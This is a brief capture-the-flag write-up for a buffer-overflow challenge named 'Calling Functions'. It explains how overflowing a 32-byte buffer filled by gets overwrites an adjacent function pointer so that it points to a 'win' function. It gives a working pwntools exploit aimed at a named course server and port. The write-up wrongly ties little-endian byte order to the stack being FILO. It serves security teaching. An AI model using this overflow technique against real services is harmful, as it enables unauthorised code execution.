# Challenge `Calling Functions` writeup

- Vulnerability:
  - Buffer Overflow
- Where: Where is the vulnerability present
  - `mustard.stt.rnl.tecnico.ulisboa.pt` on port `23153`
- Impact:
  - Allows attacker to call arbitrary functions

## Steps to reproduce

1. The `buffer` and `fp` variables are reserved consecutively
2. By writing more that 32 characters into `buffer`, the `fp` variable is affected, after the `gets` function.
3. We can set `fp` to the memory address of the `win` function
4. Since the stack is a `first-in-last-out (FILO)` structure, we need to write the bytes in `little-endian`

The code used was:

```py
from pwn import *

session = remote("mustard.stt.rnl.tecnico.ulisboa.pt", "23153", timeout=1000)
session.recvuntil('?')
session.send(b'1'*32 + b'\xf1\x86\x04\x08')
print(session.recvall())
```